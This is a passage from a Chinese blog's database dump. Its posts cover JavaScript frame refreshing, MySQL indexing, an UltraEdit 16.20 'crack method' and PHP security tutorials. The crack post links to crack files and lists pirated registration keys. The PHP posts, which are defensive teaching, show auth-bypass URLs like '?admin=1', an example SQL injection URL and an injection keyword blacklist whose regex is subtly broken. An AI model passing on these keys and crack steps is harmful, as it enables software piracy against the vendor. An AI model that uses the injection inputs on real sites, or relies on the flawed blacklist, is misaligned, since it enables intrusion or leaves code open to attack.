/>\r\n&nbsp;<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp; JS刷新框架的脚本语句<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp; //如何刷新包含该框架的页面用<br />\r\n&nbsp;&nbsp; &lt;script language=JavaScript&gt;<br />\r\n&nbsp;&nbsp; parent.location.reload();<br />\r\n&nbsp;&nbsp; &lt;/script&gt;<br />\r\n&nbsp;<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp; //子窗口刷新父窗口<br />\r\n&nbsp;&nbsp; &lt;script language=JavaScript&gt;<br />\r\n&nbsp;&nbsp; self.opener.location.reload();<br />\r\n&nbsp;&nbsp; &lt;/script&gt;<br />\r\n&nbsp;&nbsp; ( 或 &lt;a href=&quot;javascript:opener.location.reload()&quot;&gt;刷新&lt;/a&gt; )<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp; //如何刷新另一个框架的页面用<br />\r\n&nbsp;&nbsp; &lt;script language=JavaScript&gt;<br />\r\n&nbsp;&nbsp; parent.另一FrameID.location.reload();<br />\r\n&nbsp;&nbsp; &lt;/script&gt;<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp; 如果想关闭窗口时刷新或者想开窗时刷新的话，在&lt;body&gt;中调用以下语句即可。<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp; &lt;body onload=&quot;opener.location.reload()&quot;&gt; 开窗时刷新<br />\r\n&nbsp;&nbsp; &lt;body onUnload=&quot;opener.location.reload()&quot;&gt; 关闭时刷新<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp; &lt;script language=&quot;javascript&quot;&gt;<br />\r\n&nbsp;&nbsp; window.opener.document.location.reload()<br />\r\n&nbsp;&nbsp; &lt;/script&gt;页面刷新弹出重试问题解决方法</p>\r\n\r\n<p>如果刷新一个已经提交过的页面时,系统总是会提示一个 &quot;重试或取消&rdquo;的对话框.,如果是一个普通的页面,好象也无所谓,有就有,大不了多点一下.但是当我们是在子窗体中刷新父窗体时,就显得有点多余了.所以就想把这个对话框给去了.找了很的办法.总结一下.</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 一, window.opener.location.reload() 如果改页面没提交过,这个方法好使.但是这个页面一旦提交过后,系统就会提示&quot;重试或取消&rdquo;的对话框.</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 二, window.opener.location = window.opener.location;这个方法肯定不提示,但是有个问题就是分页显示的时候,一刷新总是会显示第一页,这个也是理所当然,因为默认请求的就是第一页</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 三, window.opener.form1.submit();这个方法也不提示了,这个方法就是自动提交页面,绕开那个烦人提示的界面,但是如果被刷新的页面用到了比如gridwiew控件之类的,里面的数据可能不会随着刷新而发生变化,原因就是gridwiew的数据绑定是在某个控件的事件中进行,而页面是通过submit()提交的,不会触发该控件的事件.gridwiew中的数据也是通过读取viewstat中内容获得的,所以在刷新过程中数据不会发生变化.</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 四, window.opener.__doPostBack(&quot; Control&quot;,&quot;&quot;);其中 Control 是控件ID,这个方法就是克服了三的缺点,不用.opener.form1.submit()这样直接提交.不仅让页面自动提交,而且还要想办法让控件的事件也执行.</p>\r\n\r\n<p>&nbsp;&nbsp; 注意第四种方法也不是完美的,有的页面是没有这样的控件,有的页面有这个控件但也不能触发数据绑定事件.比如页面数据是随下框内容发生变化的那种页面.因为页面数据是否重新绑定取决于下拉框中内容是否发生变化.而打开子窗体前后时下拉框内容肯定没有变化,所以页面内容也不会变化.&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 五,针对四,我们可以在父页面用点小技巧,比如在Page_Load中绑定数据时不加IsPostBack判断,但是不好就不好在点按钮时同样的数据会绑定两遍.</p>\r\n\r\n<p>如果页面没有form，则不会弹出提示窗口。如果页面有form表单，a)&lt; form method=&quot;post&quot; ...&gt; 会弹出提示窗口</p>\r\n\r\n<p>b)&lt; form method=&quot;get&quot; ...&gt; 不会弹出</p>\r\n\r\n<p>来自: http://hi.baidu.com/geniusian/blog/item/a1102f1ea50001fd1bd57692.html</p>\r\n',0,1438070718,0,0),(106,32,'MySQL索引类型一览 让MySQL高效运行起来','<p>本文介绍了七种MySQL索引类型。在数据库表中，对字段建立索引可以大大提高查询速度。通过善用这些索引，可以令 MySQL的查询和运行更加高效。 索引是快速搜索的关键。MySQL索引的建立对于MySQL的高效运行是很重要的。下面介绍几种常见的MySQL索引类型。<br />\r\n在数据库表中，对字段建立索引可以大大提高查询速度。假如我们创建了一个 mytable表：<br />\r\nCREATE TABLE mytable( ID INT NOT NULL, username VARCHAR(16) NOT NULL );<br />\r\n我们随机向里面插入了10000条记录，其中有一条：5555, admin。<br />\r\n在查找username=&quot;admin&quot;的记录 SELECT * FROM mytable WHERE username=&#39;admin&#39;;时，如果在 username上已经建立了索引，MySQL无须任何扫描，即准确可找到该记录。相反，MySQL会扫描所有记录，即要</p>\r\n\r\n<p>查询10000条记录。<br />\r\n索引分单列索引和组合索引。单列索引，即一个索引只包含单个列，一个表可以有多个单列索引，但这不是组合索引。组合索引，即一个索包含多个列。<br />\r\nMySQL索引类型包括：<br />\r\n(1)普通索引<br />\r\n这是最基本的索引，它没有任何限制。它有以下几种创建方式：<br />\r\n◆创建索引<br />\r\nCREATE INDEX indexName ON mytable(username(length));<br />\r\n如果是CHAR，VARCHAR类型，length可以小于字段实际长度;如果是BLOB和TEXT类型，必须指定 length，下同。<br />\r\n◆修改表结构<br />\r\nALTER mytable ADD INDEX [indexName] ON (username(length))<br />\r\n◆创建表的时候直接指定<br />\r\nCREATE TABLE mytable( ID INT NOT NULL, username VARCHAR(16) NOT NULL, INDEX [indexName] (username(length)) );<br />\r\n删除索引的语法：<br />\r\nDROP INDEX [indexName] ON mytable;<br />\r\n(2)唯一索引<br />\r\n它与前面的普通索引类似，不同的就是：索引列的值必须唯一，但允许有空值。如果是组合索引，则列值的组合必须唯一。它有以下几种创建方式：<br />\r\n◆创建索引<br />\r\nCREATE UNIQUE INDEX indexName ON mytable(username(length))<br />\r\n◆修改表结构<br />\r\nALTER mytable ADD UNIQUE [indexName] ON (username(length))<br />\r\n◆创建表的时候直接指定<br />\r\nCREATE TABLE mytable( ID INT NOT NULL, username VARCHAR(16) NOT NULL, UNIQUE [indexName] (username(length)) );<br />\r\n(3)主键索引<br />\r\n它是一种特殊的唯一索引，不允许有空值。一般是在建表的时候同时创建主键索引：<br />\r\nCREATE TABLE mytable( ID INT NOT NULL, username VARCHAR(16) NOT NULL, PRIMARY KEY(ID) );<br />\r\n当然也可以用 ALTER 命令。记住：一个表只能有一个主键。<br />\r\n(4)组合索引<br />\r\n为了形象地对比单列索引和组合索引，为表添加多个字段：<br />\r\nCREATE TABLE mytable( ID INT NOT NULL, username VARCHAR(16) NOT NULL, city VARCHAR(50) NOT NULL, age INT NOT NULL );<br />\r\n为了进一步榨取MySQL的效率，就要考虑建立组合索引。就是将 name, city, age建到一个索引里：<br />\r\nALTER TABLE mytable ADD INDEX name_city_age (name(10),city,age);<br />\r\n建表时，usernname长度为 16，这里用 10。这是因为一般情况下名字的长度不会超过10，这样会加速索引查询速度，还会减少索引文件的大小，提高INSERT的更新速度。<br />\r\n如果分别在 usernname，city，age上建立单列索引，让该表有3个单列索引，查询时和上述的组合索引效率也会大不一样，远远低于我们的组合索引。虽然此时有了三个索引，但MySQL只能用到其中的那个它认为似乎是最有效率的单列索引。<br />\r\n建立这样的组合索引，其实是相当于分别建立了下面三组组合索引：<br />\r\nusernname,city,age usernname,city usernname<br />\r\n为什么没有 city，age这样的组合索引呢?这是因为MySQL组合索引&ldquo;最左前缀&rdquo;的结果。简单的理解就是只从最左面的开始组合。并不是只要包含这三列的查询都会用到该组合索引，下面的几个SQL就会用到这个组合索引：<br />\r\nSELECT * FROM mytable WHREE username=&quot;admin&quot; AND city=&quot;郑州&quot; SELECT * FROM mytable WHREE username=&quot;admin&quot;<br />\r\n而下面几个则不会用到：<br />\r\nSELECT * FROM mytable WHREE age=20 AND city=&quot;郑州&quot; SELECT * FROM mytable WHREE city=&quot;郑州&quot;<br />\r\n(5)建立索引的时机<br />\r\n到这里我们已经学会了建立索引，那么我们需要在什么情况下建立索引呢?一般来说，在WHERE和JOIN中出现的列需要建立索引，但也不完全如此，因为MySQL只对&lt;，&lt;=，=，&gt;，&gt;=，BETWEEN，IN，以及某些时候的LIKE才会使用索引。例如：<br />\r\nSELECT t.Name FROM mytable t LEFT JOIN mytable m ON t.Name=m.username WHERE m.age=20 AND m.city=&#39;郑州&#39;<br />\r\n此时就需要对city和age建立索引，由于mytable表的userame也出现在了JOIN子句中，也有对它建立索引的必要。<br />\r\n刚才提到只有某些时候的LIKE才需建立索引。因为在以通配符%和_开头作查询时，MySQL不会使用索引。例如下句会使用索引：<br />\r\nSELECT * FROM mytable WHERE username like&#39;admin%&#39;<br />\r\n而下句就不会使用：<br />\r\nSELECT * FROM mytable WHEREt Name like&#39;%admin&#39;<br />\r\n因此，在使用LIKE时应注意以上的区别。<br />\r\n(6)索引的不足之处<br />\r\n上面都在说使用索引的好处，但过多的使用索引将会造成滥用。因此索引也会有它的缺点：<br />\r\n◆虽然索引大大提高了查询速度，同时却会降低更新表的速度，如对表进行INSERT、UPDATE和DELETE。因为更新表时，MySQL不仅要保存数据，还要保存一下索引文件。<br />\r\n◆建立索引会占用磁盘空间的索引文件。一般情况这个问题不太严重，但如果你在一个大表上创建了多种组合索引，索引文件的会膨胀很快。<br />\r\n索引只是提高效率的一个因素，如果你的MySQL有大数据量的表，就需要花时间研究建立最优秀的索引，或优化查询语句。<br />\r\n(7)使用索引的注意事项<br />\r\n使用索引时，有以下一些技巧和注意事项：<br />\r\n◆索引不会包含有NULL值的列<br />\r\n只要列中包含有NULL值都将不会被包含在索引中，复合索引中只要有一列含有NULL值，那么这一列对于此复合索引就是无效的。所以我们在数据库设计时不要让字段的默认值为NULL。<br />\r\n◆使用短索引<br />\r\n对串列进行索引，如果可能应该指定一个前缀长度。例如，如果有一个CHAR(255)的列，如果在前10个或20个字符内，多数值是惟一的，那么就不要对整个列进行索引。短索引不仅可以提高查询速度而且可以节省磁盘空间和I/O操作。<br />\r\n◆索引列排序<br />\r\nMySQL查询只使用一个索引，因此如果where子句中已经使用了索引的话，那么order by中的列是不会使用索引的。因此数据库默认排序可以符合要求的情况下不要使用排序操作;尽量不要包含多个列的排序，如果需要最好给这些列创建复合索引。<br />\r\n◆like语句操作<br />\r\n一般情况下不鼓励使用like操作，如果非使用不可，如何使用也是一个问题。like &ldquo;%aaa%&rdquo; 不会使用索引而like &ldquo;aaa%&rdquo;可以使用索引。<br />\r\n◆不要在列上进行运算<br />\r\nselect * from users where YEAR(adddate)&lt;2007;<br />\r\n将在每个行上进行运算，这将导致索引失效而进行全表扫描，因此我们可以改成<br />\r\nselect * from users where adddate&lt;&lsquo;2007-01-01&rsquo;;<br />\r\n◆不使用NOT IN和&lt;&gt;操作<br />\r\n以上，就对其中MySQL索引类型进行了介绍。</p>\r\n',0,1438071119,0,0),(107,41,'ultraedit 16.20 破解方法','<p>UltraEdit v16.20.0官方下载<br />\r\nhttp://www.ultraedit.com/files/ue_chinese.zip（简体中文）<br />\r\nhttp://www.ultraedit.com/files/ue_chinese_traditional.zip（繁体中文）<br />\r\n一，下载安装UltraEdit版，安装后不要运行程序。<br />\r\n二，下载UltraEdit补破解丁：http://u.115.com/file/f821066dd1<br />\r\n下载解压后，将crack文件夹中的文件覆盖UltraEdit安装文件夹内原有的文件！<br />\r\n三，运行UltraEdit程序，点击注册，输入以下用户名和注册码：<br />\r\n用户名：blog.itful.com<br />\r\n注册码：HHHIQ-KHHGS-RMLWE-MSMPR-UPYHJ-GTRLG-MJKEJ-WJIVL<br />\r\n用户名：www.doubye.com<br />\r\n注册码：HIKFE-HCOPR-SFNMH-OJJHY-RRLGL-HKQHK-NMFLN-UPGST<br />\r\n友情提示:替换前请先备份源文件。请大家支持正版。</p>\r\n',0,1438071361,0,0),(108,42,'PHP安全最大化','<p>今天在做php项目的时候,需要增加安全退出的功能,也就是要求用户点&quot;安全退出&quot;时,执行清除session操作,并转到登录页.没想到在这个地方也小&quot;卡&quot;了一下.<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 出现的问题是当我点&quot;安全退出&quot;后转到登录页,但这时如果在地址栏中输入某一个管理页面的地址,还是能进去,也就是说session并未清除.我在程序的 代码中已经使用了session_unregister()方法注销了session的变量.但还是有这个问题,问了下zw,他帮忙看了一阵也没解决了. 还是上网搜索吧,在一篇文章中 看到一段代码,他在session_unregister()后加了句session_destroy();试着也照他写的加了 session_destroy(),终于可以清除session了.我的理解是:session_unregister()方法只是注销session 变量,并未真正清除session,只有执行了session_destroy()才清除了一个session中的所有数据.</p>\r\n\r\n<p>在现在各种黑客横行的时候，如何实现自己代码安全，保证程序和服务器的安全是一个很重要的问题，我随便看了下关于php安全的资料，并不是很多，至少比asp少多了，呵呵，于是就想写点东西，来防止这些可能出现的情况。这里没有太深的含量，我只是比较简单的谈了谈。(以下操作如无具体说明，都是基于PHP+MySQL+Apache的情况)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 先来说说安全问题，我们首先看一下两篇文章：<br />\r\nhttp://www.xfocus.net/articles/200107/227.html&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\nhttp://www.xfocus.net/articles/200107/228.html</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 上面文章是安全焦点上的关于PHP安全的文章，基本上比较全面的介绍了关于PHP的一些安全问题。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 在PHP编码的时候，如果考虑到一些比较基本的安全问题，首先一点：<br />\r\n1. 初始化你的变量</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 为什么这么说呢？我们看下面的：<br />\r\nif ($admin)<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp; echo &#39;登陆成功！&#39;;<br />\r\n&nbsp;&nbsp;&nbsp; include(&#39;admin.php&#39;);<br />\r\n}<br />\r\nelse<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp; echo &#39;你不是管理员，无法进行管理！&#39;;<br />\r\n}</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 好，我们看上面的代码好像是能正常运行，没有问题，那么加入我提交一个非法的参数过去呢，那么效果会如何呢？比如我们的这个页是 http://www.traget.com/login.php，那么我们提交：http://www.target.com/login.php?admin=1，呵呵，你想一些，我们是不是直接就是管理员了，直接进行管理。<br />\r\n&nbsp;&nbsp;&nbsp; 当然，可能我们不会犯这么简单错的错误，那么一些很隐秘的错误也可能导致这个问题，比如最近暴出来的phpwind 1.3.6论坛有个漏洞，导致能够直接拿到管理员权限，就是因为有个$skin变量没有初始化，导致了后面一系列问题。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 那么我们如何避免上面的问题呢？首先，从php.ini入手，把php.ini里面的register_global = off，就是不是所有的注册变量为全局，那么就能避免了。但是，我们不是服务器管理员，只能从代码上改进了，那么我们如何改进上面的代码呢？我们改写如 下：<br />\r\n$admin = 0;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // 初始化变量<br />\r\nif ($_POST[&#39;admin_user&#39;] &amp;&amp; $_POST[&#39;admin_pass&#39;])<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp; // 判断提交的管理员用户名和密码是不是对的相应的处理代码<br />\r\n&nbsp;&nbsp;&nbsp; // ...<br />\r\n&nbsp;&nbsp;&nbsp; $admin = 1;<br />\r\n}<br />\r\nelse<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp; $admin = 0;<br />\r\n}</p>\r\n\r\n<p>if ($admin)<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp; echo &#39;登陆成功！&#39;;<br />\r\n&nbsp;&nbsp;&nbsp; include(&#39;admin.php&#39;);<br />\r\n}<br />\r\nelse<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp; echo &#39;你不是管理员，无法进行管理！&#39;;<br />\r\n}</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 那么这时候你再提交 http://www.target.com/login.php?admin=1 就不好使了，因为我们在一开始就把变量初始化为 $admin = 0 了，那么你就无法通过这个漏洞获取管理员权限。</p>\r\n\r\n<p><br />\r\n2. 防止SQL Injection (sql注射)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; SQL 注射应该是目前程序危害最大的了，包括最早从asp到php，基本上都是国内这两年流行的技术，基本原理就是通过对提交变量的不过滤形成注入点然后使恶意用户能够提交一些sql查询语句，导致重要数据被窃取、数据丢失或者损坏，或者被入侵到后台管理。<br />\r\n基本原理我就不说了，我们看看下面两篇文章就很明白了：<br />\r\nhttp://www.4ngel.net/article/36.htm<br />\r\nhttp://www.4ngel.net/article/30.htm</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 那么我们既然了解了基本的注射入侵的方式，那么我们如何去防范呢？这个就应该我们从代码去入手了。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 我们知道Web上提交数据有两种方式，一种是get、一种是post，那么很多常见的sql注射就是从get方式入手的，而且注射的语句里面一定是包含一些sql语句的，因为没有sql语句，那么如何进行，sql语句有四大句：<br />\r\n&nbsp;&nbsp;&nbsp; select 、update、delete、insert，那么我们如果在我们提交的数据中进行过滤是不是能够避免这些问题呢？<br />\r\n&nbsp;&nbsp;&nbsp; 于是我们使用正则就构建如下函数：</p>\r\n\r\n<p>/*<br />\r\n函数名称：inject_check()<br />\r\n函数作用：检测提交的值是不是含有SQL注射的字符，防止注射，保护服务器安全<br />\r\n参&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 数：$sql_str: 提交的变量<br />\r\n返 回 值：返回检测结果，ture or false<br />\r\n函数作者：heiyeluren<br />\r\n*/<br />\r\nfunction inject_check($sql_str)<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; return eregi(&#39;select|insert|update|delete|&#39;|/*|*|../|./|union|into|load_file|outfile&#39;, $sql_str);&nbsp;&nbsp;&nbsp; // 进行过滤<br />\r\n&nbsp;}</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 我们函数里把 select,insert,update,delete, union, into, load_file, outfile /*, ./ , ../ , &#39; 等等危险的参数字符串全部过滤掉，那么就能够控制提交的参数了，程序可以这么构建：</p>\r\n\r\n<p>&lt;?php<br />\r\nif (inject_check($_GET[&#39;id&#39;]))<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; exit(&#39;你提交的数据非法，请检查后重新提交！&#39;);<br />\r\n}<br />\r\nelse<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp; $id = $_GET[&#39;id&#39;];<br />\r\n&nbsp;&nbsp;&nbsp; echo &#39;提交的数据合法，请继续！&#39;;<br />\r\n}<br />\r\n?&gt;<br />\r\n&nbsp;&nbsp;&nbsp; 假设我们提交URL为：http://www.target.com/a.php?id=1，那么就会提示：<br />\r\n&nbsp;&nbsp;&nbsp; &quot;提交的数据合法，请继续！&quot;<br />\r\n&nbsp;&nbsp;&nbsp; 如果我们提交 http://www.target.com/a.php?id=1&#39; select * from tb_name<br />\r\n&nbsp;&nbsp;&nbsp; 就会出现提示：&quot;你提交的数据非法，请检查后重新提交！&quot;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 那么就达到了我们的要求。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 但是，问题还没有解决，假如我们提交的是 http://www.target.com/a.php?id=1asdfasdfasdf 呢，我们这个是符合上面的规则的，但是呢，它是不符合要求的，于是我们为了可能其他的情况，我们再构建一个函数来进行检查：</p>\r\n\r\n<p>/*<br />\r\n函数名称：verify_id()<br />\r\n函数作用：校验提交的ID类值是否合法<br />\r\n参&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 数：$id: 提交的ID值<br />\r\n返 回 值：返回处理后的ID<br />\r\n函数作者：heiyeluren<br />\r\n*/<br />\r\nfunction verify_id($id=null)<br />\r\n{<br />\r\n&nbsp;&nbsp; if (!$id) { exit(&#39;没有提交参数！&#39;); }&nbsp;&nbsp;&nbsp; // 是否为空判断<br />\r\n&nbsp;&nbsp; elseif (inject_check($id)) { exit(&#39;提交的参数非法！&#39;); }&nbsp;&nbsp;&nbsp; // 注射判断<br />\r\n&nbsp;&nbsp; elseif (!is_numeric($id)) { exit(&#39;提交的参数非法！&#39;); }&nbsp;&nbsp;&nbsp; // 数字判断<br />\r\n&nbsp;&nbsp; $id = intval($id);&nbsp;&nbsp;&nbsp; // 整型化<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp; return&nbsp; $id;<br />\r\n}</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 呵呵，那么我们就能够进行校验了，于是我们上面的程序代码就变成了下面的：</p>\r\n\r\n<p>&lt;?php<br />\r\nif (inject_check($_GET[&#39;id&#39;]))<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; exit(&#39;你提交的数据非法，请检查后重新提交！&#39;);<br />\r\n}<br />\r\nelse<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp; $id = verify_id($_GET[&#39;id&#39;]);&nbsp;&nbsp;&nbsp; // 这里引用了我们的过滤函数，对$id进行过滤<br />\r\n&nbsp;&nbsp;&nbsp; echo &#39;提交的数据合法，请继续！&#39;;<br />\r\n}<br />\r\n?&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 好，问题到这里似乎都解决了，但是我们有没有考虑过post提交的数据，大批量的数据呢？<br />\r\n&nbsp;&nbsp;&nbsp; 比如一些字符可能会对造 成危害，比如 &#39; _ &#39;, &#39; % &#39;，这些字符都有特殊意义，那么我们如果进行控制呢？还有一点，就是当我们的php.ini里面的magic_quotes_gpc = off 的时候，那么提交的不符合数据库规则的数据都是不会自动在前面加&#39; &#39;的，那么我们要控制这些问题，于是构建如下函数：</p>\r\n\r\n<p>/*<br />\r\n函数名称：str_check()<br />\r\n函数作用：对提交的字符串进行过滤<br />\r\n参&nbsp;&nbsp;&nbsp; 数：$var: 要处理的字符串<br />\r\n返 回 值：返回过滤后的字符串<br />\r\n函数作者：heiyeluren<br />\r\n*/<br />\r\nfunction str_check( $str )<br />\r\n{<br />\r\n&nbsp;&nbsp; if (!get_magic_quotes_gpc())&nbsp;&nbsp;&nbsp; // 判断magic_quotes_gpc是否打开<br />\r\n&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $str = addslashes($str);&nbsp;&nbsp;&nbsp; // 进行过滤<br />\r\n&nbsp;}<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; $str = str_replace(&quot;_&quot;, &quot;\\_&quot;, $str);&nbsp;&nbsp;&nbsp; // 把 &#39;_&#39;过滤掉<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; $str = str_replace(&quot;%&quot;, &quot;\\%&quot;, $str);&nbsp;&nbsp;&nbsp; // 把&#39; % &#39;过滤掉<br />\r\n&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp; return $str;<br />\r\n}</p>\r\n\r\n<p>OK，我们又一次的避免了服务器被沦陷的危险。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 最后，再考虑提交一些大批量数据的情况，比如发贴，或者写文章、新闻，我们需要一些函数来帮我们过滤和进行转换，再上面函数的基础上，我们构建如下函数：</p>\r\n\r\n<p>/*<br />\r\n函数名称：post_check()<br />\r\n函数作用：对提交的编辑内容进行处理<br />\r\n参&nbsp;&nbsp;&nbsp; 数：$post: 要提交的内容<br />\r\n返 回 值：$post: 返回过滤后的内容<br />\r\n函数作者：heiyeluren<br />\r\n*/<br />\r\nfunction post_check($post)<br />\r\n{<br />\r\n&nbsp;&nbsp; if (!get_magic_quotes_gpc())&nbsp;&nbsp;&nbsp; // 判断magic_quotes_gpc是否为打开<br />\r\n&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $post = addslashes($post);&nbsp;&nbsp;&nbsp; // 进行magic_quotes_gpc没有打开的情况对提交数据的过滤<br />\r\n&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp; $post = str_replace(&quot;_&quot;, &quot;\\_&quot;, $post);&nbsp;&nbsp;&nbsp; // 把 &#39;_&#39;过滤掉<br />\r\n&nbsp;&nbsp; $post = str_replace(&quot;%&quot;, &quot;\\%&quot;, $post);&nbsp;&nbsp;&nbsp; // 把&#39; % &#39;过滤掉<br />\r\n&nbsp;&nbsp; $post = nl2br($post);&nbsp;&nbsp;&nbsp; // 回车转换<br />\r\n&nbsp;&nbsp; $post= htmlspecialchars($post);&nbsp;&nbsp;&nbsp; // html标记转换<br />\r\n&nbsp;<br />\r\n&nbsp;&nbsp; return $post;<br />\r\n}</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 呵呵，基本到这里，我们把一些情况都说了一遍，其实我觉得自己讲的东西还很少，至少我才只讲了两方面，再整个安全中是很少的内容了，考虑下一次讲更多，包括php安全配置，安全等等，让我们的安全正的是一个整体，作到最安全。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; 最后在告诉你上面表达的：1. 初始化你的变量&nbsp; 2. 一定记得要过滤你的变量</p>\r\n',0,1438091966,0,0),(109,42,'PHP的安全最大化','<p>[全局变量]<br />\r\nPHP中的变量不需要事先声明，它们会在第一次使用时自动创建，它们的类型也不需要指定，它们会根据上下文环境自动确定。从程序员的角度来看，这无疑是一种极其方便的处理方法。很显然，这也是快速开发语言的一个很有用的特点。一旦一个变量被创建了，就可以在程序中的任何地方使用。这个特点导致的结果就是程序员很少初始化变量，毕竟，当它们第一次创建时，他们是空的。</p>\r\n\r\n<p>很显然，基于PHP的应用程序的主函数一般都是接受用户的输入（主要是表单变量，上载文件和Cookie等），然后对输入数据进行处理，然后把结果返回到客户端浏览器。为了使PHP代码访问用户的输入尽可能容易，实际上PHP是把这些输入数据看作全局变量来处理的。</p>\r\n\r\n<p>例如：</p>\r\n\r\n<p>&lt;FORM METHOD=&quot;GET&quot; ACTION=&quot;test.php&quot;&gt;<br />\r\n&lt;INPUT TYPE=&quot;TEXT&quot; NAME=&quot;hello&quot;&gt;<br />\r\n&lt;INPUT TYPE=&quot;SUBMIT&quot;&gt;<br />\r\n&lt;/FORM&gt;</p>\r\n\r\n<p>很显然，这会显示一个文本框和提交按钮。当用户点击提交按钮时，&ldquo;test.php&rdquo;会处理用户的输入，当&ldquo;test.php&rdquo;运行时，&ldquo;$hello&rdquo;会包含用户在文本框输入的数据。从这里我们应该看出，攻击者可以按照自己的意愿创建任意的全局变量。如果攻击者不是通过表单输入来调用&ldquo;test.php&rdquo;，而是直接在浏览器地址栏输入http://server/test.php?hello=hi&amp;setup=no，那么，不止是&ldquo;$hello&rdquo;被创建，&ldquo;$setup&rdquo;也被创建了。</p>\r\n\r\n<p>译者注：这两种方法也就是我们通常说的&ldquo;POST&rdquo;和&ldquo;GET&rdquo;方法。<br />\r\n下面的用户认证代码暴露了PHP的全局变量所导致的安全问题：</p>\r\n\r\n<p>&lt;?php<br />\r\nif ($pass == &quot;hello&quot;)<br />\r\n&nbsp;&nbsp;&nbsp; $auth = 1;<br />\r\n...<br />\r\nif ($auth == 1)<br />\r\n&nbsp;&nbsp;&nbsp; echo &quot;some important information&quot;;<br />\r\n?&gt;</p>\r\n\r\n<p>上面的代码首先检查用户的密码是否为&ldquo;hello&rdquo;，如果匹配的话，设置&ldquo;$auth&rdquo;为&ldquo;1&rdquo;，即通过认证。之后如果&ldquo;$suth&rdquo;为&ldquo;1&rdquo;的话，就会显示一些重要信息。</p>\r\n\r\n<p>表面看起来是正确的，而且我们中有相当一部分人是这样做的，但是这段代码犯了想当然的错误，它假定&ldquo;$auth&rdquo;在没有设置值的时候是空的，却没有想到攻击者可以创建任何全局变量并赋值，通过类似&ldquo;http://server/test.php?auth=1&rdquo;的方法，我们完全可以欺骗这段代码，使它相信我们是已经认证过的。</p>\r\n\r\n<p>因此，为了提高PHP程序的安全性，我们不能相信任何没有明确定义的变量。如果程序中的变量很多的话，这可是一项非常艰巨的任务。</p>\r\n\r\n<p>一种常用的保护方式就是检查数组HTTP_GET[]或POST_VARS[]中的变量，这依赖于我们的提交方式（GET或POST）。当PHP配置为打开&ldquo;track_vars&rdquo;选项的话（这是缺省值），用户提交的变量就可以在全局变量和上面提到的数组中获得。</p>\r\n\r\n<p>但是值得说明的是，PHP有四个不同的数组变量用来处理用户的输入。HTTP_GET_VARS数组用来处理GET方式提交的变量，HTTP_POST_VARS数组用于处理POST方式提交的变量，HTTP_COOKIE_VARS数组用于处理作为cookie头提交的变量，而对于HTTP_POST_FILES数组（比较新的PHP才提供），则完全是用户用来提交变量的一种可选方式。用户的一个请求可以很容易的把变量存在这四个数组中，因此一个安全的PHP程序应该检查这四个数组。</p>\r\n\r\n<p>[远程文件]<br />\r\nPHP是一种具有丰富特性的语言，提供了大量的函数，使编程者实现某个功能很容易。但是从安全的角度来看，功能越多，要保证它的安全性就越难，远程文件就是说明这个问题的一个很好的例子：</p>\r\n\r\n<p>&lt;?php<br />\r\nif (!($fd = fopen(&quot;$filename&quot;, &quot;r&quot;))<br />\r\n&nbsp;&nbsp;&nbsp; echo(&quot;Could not open file: $filename&lt;BR&gt;\\n&quot;);<br 